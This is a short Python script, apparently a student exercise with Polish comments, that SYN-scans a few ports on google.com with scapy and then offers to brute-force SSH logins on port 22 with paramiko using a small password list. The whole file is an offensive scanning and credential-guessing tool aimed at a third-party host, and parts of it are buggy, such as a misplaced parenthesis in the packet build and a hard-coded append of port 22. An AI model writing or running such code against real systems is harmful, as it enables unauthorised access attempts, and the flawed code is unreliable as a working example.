##from scapy.all import *
import os
import sys
from scapy.layers.inet import IP, TCP, ICMP
from scapy.config import conf
from scapy.sendrecv import sr1, sr
from scapy.volatile import RandShort
import paramiko

target = 'google.com'
#registered_points = range(0, 1023)
registered_points = [22, 80, 631] #testowo
open_ports = []

if not os.geteuid() == 0:
    sys.exit("\nOnly root can run this script\n")


def brute_force(brute_port):
    user = 'login'
    ssh_conn = paramiko.SSHClient()
    ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    password_list = ['123', 'admin']
    for password in password_list:
        try:
            ssh_conn.connect(target, port=int(brute_port), username=user, password=password, timeout=1)
            print(f'{password} is ok')
            ssh_conn.close()
        except:
            print(f'{password} failed')


def check_availability():
    res = sr1(IP(dst=target) / ICMP(), timeout=3)
    if res is None:
        return False
    else:
        return True


def scanport(port):
    try:
        temp = RandShort()
        conf.verb = 0
        p = IP(dst=target) / TCP(sport=temp, dport=port, flags='S')
        r = sr1(p, timeout=0.5)
        if r is None:
            print(f'{port} -> r is: {r}')
            return False
        print(f'{port} -> r is: {r}')
        syn_pkt: int = r.haslayer(TCP)

        if syn_pkt == False:
            print(f'syn_kt is: {syn_pkt}')
            return False
        print(type(r))
        if 'x12' in r: #ten warunke jest do poprawienia
            p = IP(dst=target / TCP(dport=port, flags='S'))
            ress = sr(p, timeout=2)
            if ress is None:
                return False
            res = sr1(IP(dst=target) / ICMP(), timeout=3)
            print(f'res: {res}')
            return True

    except RuntimeError:
        print(RuntimeError)
        return False
    except TypeError:
        print(TypeError)
        return False


for port in registered_points:
    result = scanport(port)
    if result == True:
        available = check_availability()
        open_ports.append(port)

print("Finished scanning")
print(f"open ports: {open_ports}")
open_ports.append(22) #testowo
if open_ports.__contains__(22):
    answer = input('Do you want brute force on port 22? (Y)')
    if answer == 'Y' or answer == 'y':
        brute_force(22)
